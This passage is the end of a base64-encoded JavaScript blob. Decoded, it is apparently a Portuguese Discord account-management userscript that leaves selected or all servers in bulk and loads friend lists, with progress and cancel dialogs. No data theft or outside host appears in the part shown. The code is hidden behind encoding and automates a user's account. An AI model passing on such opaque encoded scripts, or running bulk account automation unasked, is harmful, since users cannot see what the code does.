J2ZXJzJykub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlZnJlc2gtc2VydmVycycpOwogICAgICAgICAgICBidG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBidG4udGV4dENvbnRlbnQgPSAnQXR1YWxpemFuZG8uLi4nOwogICAgICAgICAgICBjb25zdCBzZXJ2ZXJzRGF0YSA9IGF3YWl0IGZldGNoU2VydmVycygpOwogICAgICAgICAgICByZW5kZXJTZXJ2ZXJzKHNlcnZlcnNEYXRhLCBzZWFyY2hJbnB1dC52YWx1ZSk7CiAgICAgICAgICAgIGJ0bi5kaXNhYmxlZCA9IGZhbHNlOwogICAgICAgICAgICBidG4udGV4dENvbnRlbnQgPSAnQXR1YWxpemFyJzsKICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignTGlzdGEgYXR1YWxpemFkYSEnLCAnc3VjY2VzcycpOwogICAgICAgIH07CgogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsZWF2ZS1zZWxlY3RlZC1zZXJ2ZXJzJykub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3Qgc2VsZWN0ZWQgPSBBcnJheS5mcm9tKGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgnLmRmbS1zZXJ2ZXIuc2VsZWN0ZWQnKSk7CiAgICAgICAgICAgIGlmICghc2VsZWN0ZWQubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCdTZWxlY2lvbmUgcGVsbyBtZW5vcyB1bSBzZXJ2aWRvciEnLCAnd2FybmluZycpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBzaG93Q29uZmlybU1vZGFsKGBTYWlyIGRlICR7c2VsZWN0ZWQubGVuZ3RofSBzZXJ2aWRvcihlcyk/YCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc3QgeyBtb2RhbDogcHJvZ3Jlc3NNb2RhbCwgc3RhdGU6IGNhbmNlbFN0YXRlIH0gPSBjcmVhdGVQcm9ncmVzc01vZGFsKCdTYWluZG8gZGUgU2Vydmlkb3JlcycsIHNlbGVjdGVkLmxlbmd0aCk7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHByb2dyZXNzTW9kYWwpOwogICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NUZXh0ID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtdGV4dCcpOwogICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy1iYXInKTsKICAgICAgICAgICAgICAgIGxldCBsZWZ0Q291bnQgPSAwOwoKICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc2VsZWN0ZWQubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSBicmVhazsKICAgICAgICAgICAgICAgICAgICBjb25zdCBlbCA9IHNlbGVjdGVkW2ldOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IGxlYXZlU2VydmVyKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5pY29uKTsKICAgICAgICAgICAgICAgICAgICBlbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgICAgICBsZWZ0Q291bnQrKzsKICAgICAgICAgICAgICAgICAgICB1cGRhdGVQcm9ncmVzcyhwcm9ncmVzc1RleHQsIHByb2dyZXNzQmFyLCBpICsgMSwgc2VsZWN0ZWQubGVuZ3RoLCAnc2Vydmlkb3JlcycpOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYENhbmNlbGFkbyEgU2FpdSBkZSAke2xlZnRDb3VudH0gc2Vydmlkb3Jlcy5gLCAnd2FybmluZycpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKGBTYWl1IGRlICR7c2VsZWN0ZWQubGVuZ3RofSBzZXJ2aWRvcmVzIWAsICdzdWNjZXNzJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH07CgogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsZWF2ZS1hbGwtc2VydmVycycpLm9uY2xpY2sgPSBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGFsbFNlcnZlcnMgPSBBcnJheS5mcm9tKGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgnLmRmbS1zZXJ2ZXInKSk7CiAgICAgICAgICAgIGlmICghYWxsU2VydmVycy5sZW5ndGgpIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ05lbmh1bSBzZXJ2aWRvciBwYXJhIHNhaXIhJywgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgc2hvd0NvbmZpcm1Nb2RhbChgQVRFTsOHw4NPISBTYWlyIGRlIFRPRE9TIG9zICR7YWxsU2VydmVycy5sZW5ndGh9IHNlcnZpZG9yZXM/PGJyPjxicj5Fc3RhIGHDp8OjbyBuw6NvIHBvZGUgc2VyIGRlc2ZlaXRhIWAsIGFzeW5jICgpID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgbW9kYWw6IHByb2dyZXNzTW9kYWwsIHN0YXRlOiBjYW5jZWxTdGF0ZSB9ID0gY3JlYXRlUHJvZ3Jlc3NNb2RhbCgnU2FpbmRvIGRlIFNlcnZpZG9yZXMnLCBhbGxTZXJ2ZXJzLmxlbmd0aCk7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHByb2dyZXNzTW9kYWwpOwogICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NUZXh0ID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtdGV4dCcpOwogICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy1iYXInKTsKICAgICAgICAgICAgICAgIGxldCBsZWZ0Q291bnQgPSAwOwoKICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYWxsU2VydmVycy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGVsID0gYWxsU2VydmVyc1tpXTsKICAgICAgICAgICAgICAgICAgICBhd2FpdCBsZWF2ZVNlcnZlcihlbC5kYXRhc2V0LmlkLCBlbC5kYXRhc2V0Lm5hbWUsIGVsLmRhdGFzZXQuaWNvbik7CiAgICAgICAgICAgICAgICAgICAgZWwucmVtb3ZlKCk7CiAgICAgICAgICAgICAgICAgICAgbGVmdENvdW50Kys7CiAgICAgICAgICAgICAgICAgICAgdXBkYXRlUHJvZ3Jlc3MocHJvZ3Jlc3NUZXh0LCBwcm9ncmVzc0JhciwgaSArIDEsIGFsbFNlcnZlcnMubGVuZ3RoLCAnc2Vydmlkb3JlcycpOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYENhbmNlbGFkbyEgU2FpdSBkZSAke2xlZnRDb3VudH0gc2Vydmlkb3Jlcy5gLCAnd2FybmluZycpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBjb250ZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlYXJjaC1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJkZm0tc2VhcmNoIiBpZD0ic2VydmVycy1zZWFyY2giIHBsYWNlaG9sZGVyPSJCdXNjYXIgc2Vydmlkb3Jlcy4uLiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPk5lbmh1bSBzZXJ2aWRvcjwvZGl2PgogICAgICAgICAgICAgICAgICAgIGA7CiAgICAgICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignU2FpdSBkZSB0b2RvcyBvcyBzZXJ2aWRvcmVzIScsICdzdWNjZXNzJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH07CiAgICB9OwoKICAgIGNvbnN0IGNyZWF0ZVByb2dyZXNzTW9kYWwgPSAodGl0bGUsIHRvdGFsLCBzaG93Q2FuY2VsID0gdHJ1ZSkgPT4gewogICAgICAgIGNvbnN0IHN0YXRlID0geyBjYW5jZWxsZWQ6IGZhbHNlIH07CiAgICAgICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICBtb2RhbC5jbGFzc05hbWUgPSAnZGZtLW1vZGFsJzsKICAgICAgICBtb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1jb250ZW50Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC10aXRsZSI+JHt0aXRsZX08L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy10ZXh0IiBpZD0icHJvZ3Jlc3MtdGV4dCI+MC8ke3RvdGFsfTwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1iYXItY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhciIgaWQ9InByb2dyZXNzLWJhciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICR7c2hvd0NhbmNlbCA/ICc8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtYWN0aW9ucyI+PGJ1dHRvbiBjbGFzcz0iZGZtLWJ0bi1jYW5jZWwiIGlkPSJjYW5jZWwtb3BlcmF0aW9uIj5DYW5jZWxhcjwvYnV0dG9uPjwvZGl2PicgOiAnJ30KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgYDsKCiAgICAgICAgaWYgKHNob3dDYW5jZWwpIHsKICAgICAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcignI2NhbmNlbC1vcGVyYXRpb24nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsKICAgICAgICAgICAgICAgIHN0YXRlLmNhbmNlbGxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBtb2RhbC5xdWVyeVNlbGVjdG9yKCcjY2FuY2VsLW9wZXJhdGlvbicpLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgIG1vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNjYW5jZWwtb3BlcmF0aW9uJykudGV4dENvbnRlbnQgPSAnQ2FuY2VsYW5kby4uLic7CiAgICAgICAgICAgICAgICBtb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtdGV4dCcpLnRleHRDb250ZW50ID0gJ0NhbmNlbGFuZG8gb3BlcmHDp8Ojby4uLic7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHsgbW9kYWwsIHN0YXRlIH07CiAgICB9OwoKICAgIGNvbnN0IHVwZGF0ZVByb2dyZXNzID0gKHRleHRFbGVtZW50LCBiYXJFbGVtZW50LCBjdXJyZW50LCB0b3RhbCwgdHlwZSkgPT4gewogICAgICAgIGNvbnN0IHBlcmNlbnQgPSAoY3VycmVudCAvIHRvdGFsKSAqIDEwMDsKICAgICAgICB0ZXh0RWxlbWVudC50ZXh0Q29udGVudCA9IGAke3R5cGUgPT09ICdhbWlnb3MnID8gJ1JlbW92ZW5kbycgOiAnU2FpbmRvIGRlJ30gJHtjdXJyZW50fS8ke3RvdGFsfSAke3R5cGV9YDsKICAgICAgICBiYXJFbGVtZW50LnN0eWxlLndpZHRoID0gYCR7cGVyY2VudH0lYDsKICAgIH07CgogICAgdHJ5IHsKICAgICAgICBjb25zdCBmcmllbmRzRGF0YSA9IGF3YWl0IGZldGNoRnJpZW5kcygpOwogICAgICAgIHJlbmRlckZyaWVuZHMoZnJpZW5kc0RhdGEuZmlsdGVyKGYgPT4gZi50eXBlID09PSAxKSk7CiAgICAgICAgY29uc3Qgc2VydmVyc0RhdGEgPSBhd2FpdCBmZXRjaFNlcnZlcnMoKTsKICAgICAgICByZW5kZXJTZXJ2ZXJzKHNlcnZlcnNEYXRhKTsKICAgIH0gY2F0Y2ggewogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmcmllbmRzLXRhYicpLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlYXJjaC1jb250YWluZXIiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJkZm0tc2VhcmNoIiBpZD0iZnJpZW5kcy1zZWFyY2giIHBsYWNlaG9sZGVyPSJCdXNjYXIgYW1pZ29zLi4uIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+RXJybyBhbyBjYXJyZWdhciBhbWlnb3M8L2Rpdj4KICAgICAgICBgOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZXJ2ZXJzLXRhYicpLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlYXJjaC1jb250YWluZXIiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJkZm0tc2VhcmNoIiBpZD0ic2VydmVycy1zZWFyY2giIHBsYWNlaG9sZGVyPSJCdXNjYXIgc2Vydmlkb3Jlcy4uLiI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPkVycm8gYW8gY2FycmVnYXIgc2Vydmlkb3JlczwvZGl2PgogICAgICAgIGA7CiAgICAgICAgc2hvd05vdGlmaWNhdGlvbignRXJybyBhbyBjYXJyZWdhciBkYWRvcycsICdlcnJvcicpOwogICAgfQoKICAgIGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uKCk7Cn0pKCk7");
